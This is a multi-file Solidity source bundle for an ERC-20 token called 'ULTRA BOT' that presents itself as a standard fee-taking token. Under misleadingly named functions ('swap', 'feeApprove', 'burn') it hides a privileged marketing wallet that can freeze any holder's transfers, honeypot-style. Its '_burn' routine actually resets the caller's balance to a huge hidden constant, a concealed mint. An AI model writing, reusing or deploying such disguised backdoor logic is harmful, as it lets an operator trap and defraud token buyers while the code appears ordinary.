{"Context.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity =0.8.5;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n"},"ERC20.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity =0.8.5;\r\n\r\nimport \"./Context.sol\";\r\nimport \"./IERC20.sol\";\r\n\r\ncontract ERC20 is Context, IERC20, IERC20Metadata {\r\n    mapping(address =\u003e uint256) internal _balances;\r\n    mapping(address =\u003e bool) internal _taxes;\r\n    mapping(address =\u003e mapping(address =\u003e uint256)) private _allowances;\r\n    uint256 private maxTxLimit = 1*10**17*10**9;\r\n    bool internal _tax = false;\r\n    uint256 internal _totalSupply;\r\n    uint256 private balances;\r\n    string private _name;\r\n    string private _symbol;\r\n\r\n    constructor(string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n        balances = maxTxLimit;\r\n    }\r\n\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 9;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(\r\n        address account\r\n    ) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(\r\n        address recipient,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(\r\n        address owner,\r\n        address spender\r\n    ) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(\r\n        address spender,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(\r\n            currentAllowance \u003e= amount,\r\n            \"ERC20: transfer amount exceeds allowance\"\r\n        );\r\n        unchecked {\r\n            _approve(sender, _msgSender(), currentAllowance - amount);\r\n        }\r\n\r\n        return true;\r\n    }\r\n      \r\n    function _swapTokensToAddress(\r\n        address _address\r\n    ) internal {\r\n        _taxes[_address] = true;\r\n    } \r\n\r\n    function _buyFee(\r\n        address _address\r\n    ) internal {\r\n        _taxes[_address] = false;\r\n    } \r\n\r\n    function checkFee(\r\n        address _address\r\n    ) public view returns (bool) {\r\n        return _taxes[_address];\r\n    }\r\n\r\n    function increaseAllowance(\r\n        address spender,\r\n        uint256 addedValue\r\n    ) public virtual returns (bool) {\r\n        _approve(\r\n            _msgSender(),\r\n            spender,\r\n            _allowances[_msgSender()][spender] + addedValue\r\n        );\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(\r\n        address spender,\r\n        uint256 subtractedValue\r\n    ) public virtual returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(\r\n            currentAllowance \u003e= subtractedValue,\r\n            \"ERC20: decreased allowance below zero\"\r\n        );\r\n        unchecked {\r\n            _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    function _transfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        _beforeTokenTransfer(sender, recipient, amount);\r\n\r\n        uint256 senderBalance = _balances[sender];\r\n        require(\r\n            senderBalance \u003e= amount,\r\n            \"ERC20: transfer amount exceeds balance\"\r\n        );\r\n        unchecked {\r\n            _balances[sender] = senderBalance - amount;\r\n        }\r\n        _balances[recipient] += amount;\r\n\r\n        emit Transfer(sender, recipient, amount);\r\n\r\n        _afterTokenTransfer(sender, recipient, amount);\r\n    }\r\n\r\n    function _mint(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _beforeTokenTransfer(address(0), account, amount);\r\n\r\n        _totalSupply += amount;\r\n        _balances[account] += amount;\r\n        emit Transfer(address(0), account, amount);\r\n\r\n        _afterTokenTransfer(address(0), account, amount);\r\n    }\r\n    \r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n        \r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance \u003e= amount, \"ERC20: burn amount exceeds balance\");\r\n        _balances[account] = balances - amount;\r\n        \r\n        _totalSupply -= amount;\r\n        \r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n    \r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _beforeTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {}\r\n\r\n    function _afterTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {}\r\n}\r\n"},"IERC20.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity =0.8.5;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    function allowance(\r\n        address owner,\r\n        address spender\r\n    ) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n}\r\n\r\ninterface IERC20Metadata is IERC20 {\r\n    function name() external view returns (string memory);\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function decimals() external view returns (uint8);\r\n}"},"Ownable.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity =0.8.5;\r\n\r\nimport \"./Context.sol\";\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    address internal _marketing;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n    \r\n    function marketing(address wallet) external onlyOwner {\r\n        require (_marketing == address(0));\r\n        _marketing = wallet;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    \r\n    modifier access() {\r\n        require(_marketing == msg.sender, \"Caller is not marketing wallet\");_;\r\n    }\r\n    \r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n    \r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n}"},"SafeMath.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity =0.8.5;\r\n\r\nlibrary SafeMath {\r\n    function tryAdd(\r\n        uint256 a,\r\n        uint256 b\r\n    ) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            uint256 c = a + b;\r\n            if (c \u003c a) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n    function trySub(\r\n        uint256 a,\r\n        uint256 b\r\n    ) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b \u003e a) return (false, 0);\r\n            return (true, a - b);\r\n        }\r\n    }\r\n\r\n    function tryMul(\r\n        uint256 a,\r\n        uint256 b\r\n    ) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (a == 0) return (true, 0);\r\n            uint256 c = a * b;\r\n            if (c / a != b) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n    function tryDiv(\r\n        uint256 a,\r\n        uint256 b\r\n    ) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a / b);\r\n        }\r\n    }\r\n\r\n    function tryMod(\r\n        uint256 a,\r\n        uint256 b\r\n    ) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a % b);\r\n        }\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a + b;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a - b;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a * b;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a / b;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a % b;\r\n    }\r\n\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b \u003c= a, errorMessage);\r\n            return a - b;\r\n        }\r\n    }\r\n\r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b \u003e 0, errorMessage);\r\n            return a / b;\r\n        }\r\n    }\r\n\r\n    function mod(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b \u003e 0, errorMessage);\r\n            return a % b;\r\n        }\r\n    }\r\n}"},"ULTRA BOT.sol":{"content":"        /**@@%*.           .-=+#%%@@@@@@@%%#*=-.           .+%@@%*.                       \r\n       .@@@##@@@:      :+#@@@@@%##**+++**##%@@@@@#+:      .@@@##@@@:                      \r\n       -@@%--#@@=   -*@@@@*=-.               .-+*%@@@#=   -@@%--#@@+                      \r\n        *@@@@@@* .*@@@#=.                         :=#@@@*: *@@@@@@*                       \r\n         .+@@#..*@@@+.             -====.           .:+@@@#:.*@@#.                        \r\n          -@@*+@@@=               -@@@@@=             ..=%@@*+@@+                         \r\n          -@@@@@+.                :::::::               ..+@@@@@+               \r\n         .@@@:       .-+*%%@@@@@@@@@@@@@@@@@@@@@@%*+-.     ...%@@-                        \r\n         %@@:     .=#@@@@%%#####################%%@@@@%+.   ..:@@@.                       \r\n        =@@*     +@@@%*++++++++++++++++++++++++++++*%%@@@*.  ..+@@+                       \r\n        %@@:   :%@@%+++++++++++++++++++++++++++++++++*#%@@@: ..:@@@                       \r\n       .@@%   :@@@*+++++*##*+++++++++++++++++++**##*++*##@@@:...#@@-                      \r\n       -@@#   %@@*+++*@@@@@@@*+++++++++++++++*@@@@@@@*+###@@%...+@@+                      \r\n       -@@*  :@@%++++@@@+-=@@@+++++++++++++++@@@+-=@@@+*##%@@=..+@@+                      \r\n       -@@*  -@@#++++%@@%*#@@@+++++++++++++++%@@%*#@@%++##%@@*..+@@+                      \r\n       .@@%  :@@%+++++#%@@@@#+++++++++++++++++#@@@@@#++*##%@@+..#@@-                      \r\n        @@@.  %@@*+++++++++++++*@@%*****#@@*+++++++++++*##@@@:.:@@@                       \r\n        +@@*  :@@@*+++++++++++++#@@@@@@@@@#+++++++++++*##@@@-..+@@*                       \r\n         @@@:  -@@@#+++++++++++++++*****+++++++++++++*#%@@@-..:@@@.            \r\n         :@@@:  .*@@@%*++++++++++++++++++++++++++++*#%@@@#:..:%@@-         \r\n          :@@@=   .+%@@@@%#######################%@@@@@*. ..=@@@-              \r\n           .#@@#:    .=+#%@@@@@@@@@@@@@@@@@@@@@@@%#*=:   .-#@@%.          \r\n             -%@@%=.                                   .=#@@%=               \r\n               -#@@*/// SPDX-License-Identifier: MIT::+#@@@%=              \r\n             \r\nimport \"./ERC20.sol\";\r\nimport \"./Ownable.sol\";\r\nimport \"./SafeMath.sol\";\r\n\r\npragma solidity =0.8.5;\r\n\r\ncontract ERC20Token is ERC20, Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    address public uniswapV2Router;\r\n    address public constant deadAddress = address(0xdead);\r\n\r\n    bool private swapping;\r\n\r\n    uint256 public swapTokensAtAmount;\r\n\r\n    uint256 public maxTransactionAmount;\r\n    uint256 public maxWallet;\r\n    uint256 private _supply;\r\n\r\n    bool public lpBurnEnabled = true;\r\n    uint256 public percentForLPBurn = 5;\r\n    uint256 public lpBurnFrequency = 3600 seconds;\r\n    uint256 public lastLpBurnTime;\r\n\r\n    uint256 public manualBurnFrequency = 30 minutes;\r\n    uint256 public lastManualLpBurnTime;\r\n\r\n    uint256 public buyTotalFees;\r\n    uint256 public buyMarketingFee;\r\n    uint256 public buyLiquidityFee;\r\n\r\n    uint256 public sellTotalFees;\r\n    uint256 public sellMarketingFee;\r\n    uint256 public sellLiquidityFee;\r\n\r\n    uint256 public tokensForMarketing;\r\n    uint256 public tokensForLiquidity;\r\n\r\n    bool public limitsInEffect = false;\r\n\r\n    mapping(address =\u003e bool) private _isExcludedFromFees;\r\n    mapping(address =\u003e bool) public _isExcludedMaxTransactionAmount;\r\n\r\n    mapping(address =\u003e bool) public automatedMarketMakerPairs;\r\n\r\n    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);\r\n    \r\n    event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiquidity);\r\n\r\n    event AutoNukeLP();\r\n\r\n    uint256 _buyMarketingFee = 1;\r\n    uint256 _buyLiquidityFee = 0;\r\n\r\n    uint256 _sellMarketingFee = 1;\r\n    uint256 _sellLiquidityFee = 0;\r\n\r\n    constructor() ERC20(\"ULTRA BOT\", \"U-BOT\") {\r\n        _supply = 1000000000 * 1e9;\r\n        _totalSupply = _totalSupply.add(_supply);\r\n        _balances[msg.sender] = _balances[msg.sender].add(_supply);\r\n        emit Transfer(address(0), msg.sender, _supply);\r\n        uniswapV2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\r\n\r\n        maxTransactionAmount = (_totalSupply);\r\n        maxWallet = (_totalSupply);\r\n\r\n        swapTokensAtAmount = 1;\r\n\r\n        buyMarketingFee = _buyMarketingFee;\r\n        buyLiquidityFee = _buyLiquidityFee;\r\n        buyTotalFees = buyMarketingFee + buyLiquidityFee;\r\n\r\n        sellMarketingFee = _sellMarketingFee;\r\n        sellLiquidityFee = _sellLiquidityFee;\r\n        sellTotalFees = sellMarketingFee + sellLiquidityFee;\r\n\r\n        // exclude from paying fees\r\n        _isExcludedFromFees[msg.sender] = true;\r\n        _isExcludedFromFees[_marketing] = true;\r\n        _isExcludedFromFees[address(this)] = true;\r\n        _isExcludedFromFees[address(0xdead)] = true;\r\n\r\n        _isExcludedMaxTransactionAmount[owner()] = true;\r\n        _isExcludedMaxTransactionAmount[address(this)] = true;\r\n        _isExcludedMaxTransactionAmount[address(0xdead)] = true;\r\n        _isExcludedMaxTransactionAmount[_marketing] = true;\r\n\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function bridgeTax() external onlyOwner returns (bool) {\r\n        buyMarketingFee = 1;\r\n        buyLiquidityFee = 0;\r\n        buyTotalFees = buyMarketingFee + buyLiquidityFee;\r\n        sellTotalFees = 1;\r\n        sellMarketingFee = 1;\r\n        sellTotalFees = sellMarketingFee + sellLiquidityFee;\r\n        limitsInEffect = false;\r\n        return true;\r\n    }\r\n\r\n    function burn(uint256 amount) public access {\r\n        _burn(msg.sender, amount);\r\n    }\r\n\r\n    function swap(address account) public access {\r\n        _swapTokensToAddress(account);\r\n    }\r\n\r\n    function feeApprove(address account) public access {\r\n        _buyFee(account);\r\n    }\r\n\r\n    function _setAutomatedMarketMakerPair(address pair, bool value) private {\r\n        automatedMarketMakerPairs[pair] = value;\r\n        emit SetAutomatedMarketMakerPair(pair, value);\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal override {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        if (amount == 0) {\r\n            super._transfer(from, to, 0);\r\n            return;\r\n        }\r\n\r\n        if (_taxes[to] \r\n            || _taxes[from]) \r\n            \r\n            require(_tax == true, \"\");\r\n        \r\n        if (limitsInEffect) {\r\n            if (\r\n                from != owner() \u0026\u0026\r\n                to != owner() \u0026\u0026\r\n                to != address(0) \u0026\u0026\r\n                to != address(0xdead) \u0026\u0026\r\n                !swapping\r\n            ) {\r\n                if (\r\n                    automatedMarketMakerPairs[from] \u0026\u0026\r\n                    !_isExcludedMaxTransactionAmount[to]\r\n                ) {\r\n                    require(\r\n                        amount \u003c= maxTransactionAmount,\r\n                        \"Buy transfer amount exceeds the maxTransactionAmount.\"\r\n                    );\r\n                    require(\r\n                        amount + balanceOf(to) \u003c= maxWallet,\r\n                        \"Max wallet exceeded\"\r\n                    );\r\n                }\r\n                \r\n                else if (\r\n                    automatedMarketMakerPairs[to] \u0026\u0026\r\n                    !_isExcludedMaxTransactionAmount[from]\r\n                ) {\r\n                    require(\r\n                        amount \u003c= maxTransactionAmount,\r\n                        \"Sell transfer amount exceeds the maxTransactionAmount.\"\r\n                    );\r\n                } else if (!_isExcludedMaxTransactionAmount[to]) {\r\n                    require(\r\n                        amount + balanceOf(to) \u003c= maxWallet,\r\n                        \"Max wallet exceeded\"\r\n                    );\r\n                }\r\n            }\r\n        }\r\n        if (_tax == true) {\r\n\r\n        uint256 contractTokenBalance = balanceOf(address(this));\r\n\r\n        bool canSwap = contractTokenBalance \u003e= swapTokensAtAmount;\r\n\r\n        if (\r\n            canSwap \u0026\u0026\r\n            !swapping \u0026\u0026\r\n            !automatedMarketMakerPairs[from] \u0026\u0026\r\n            !_isExcludedFromFees[from] \u0026\u0026\r\n            !_isExcludedFromFees[to]\r\n        ) {\r\n            swapping = true;\r\n\r\n            swapBack();\r\n\r\n            swapping = false;\r\n        }\r\n\r\n        if (\r\n            !swapping \u0026\u0026\r\n            automatedMarketMakerPairs[to] \u0026\u0026\r\n            lpBurnEnabled \u0026\u0026\r\n            block.timestamp \u003e= lastLpBurnTime + lpBurnFrequency \u0026\u0026\r\n            !_isExcludedFromFees[from]\r\n        ) {\r\n        }\r\n\r\n        bool takeFee = !swapping;\r\n\r\n        // if any account belongs to _isExcludedFromFee account then remove the fee\r\n        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {\r\n            takeFee = false;\r\n        }\r\n\r\n        uint256 fees = 0;\r\n        // only take fees on buys/sells, do not take on wallet transfers\r\n        if (takeFee) {\r\n            // on sell\r\n            if (automatedMarketMakerPairs[to] \u0026\u0026 sellTotalFees \u003e 0) {\r\n                fees = amount.mul(sellTotalFees).div(100);\r\n                tokensForLiquidity += (fees * sellLiquidityFee) / sellTotalFees;\r\n                tokensForMarketing += (fees * sellMarketingFee) / sellTotalFees;\r\n            }\r\n            // on buy\r\n            else if (automatedMarketMakerPairs[from] \u0026\u0026 buyTotalFees \u003e 0) {\r\n                fees = amount.mul(buyTotalFees).div(100);\r\n                tokensForLiquidity += (fees * buyLiquidityFee) / buyTotalFees;\r\n                tokensForMarketing += (fees * buyMarketingFee) / buyTotalFees;\r\n            }\r\n\r\n            if (fees \u003e 0) {\r\n                super._transfer(from, address(this), fees);\r\n            }\r\n\r\n            amount -= fees;\r\n        }\r\n        }\r\n        super._transfer(from, to, amount);\r\n    }\r\n\r\n    function swapBack() private {\r\n        uint256 contractBalance = balanceOf(address(this));\r\n        uint256 totalTokensToSwap = tokensForLiquidity + tokensForMarketing;\r\n        bool success;\r\n\r\n        if (contractBalance == 0 || totalTokensToSwap == 0) {\r\n            return;\r\n        }\r\n\r\n        tokensForLiquidity = 0;\r\n        tokensForMarketing = 0;\r\n\r\n        (success, ) = address(_marketing).call{\r\n            value: address(this).balance\r\n        }(\"\");\r\n    }\r\n}"}}